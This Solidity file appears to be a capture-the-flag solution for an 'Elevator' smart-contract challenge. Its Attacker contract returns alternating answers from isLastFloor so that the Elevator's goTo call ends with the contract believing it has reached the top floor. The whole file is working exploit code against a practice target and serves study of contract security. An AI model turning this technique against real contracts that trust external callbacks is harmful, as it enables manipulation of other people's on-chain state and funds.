// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract Attacker is Building {
    Elevator public elevator;
    bool public state;

    constructor(address _contract) {
        elevator = Elevator(_contract);
    }

    function attack() public {
        elevator.goTo(1);
    }
    function isLastFloor(uint) external returns (bool) {
        if (!state) {
            state = true;
            return false;
        } else {
            state = false;
            return true;
      }
    }
}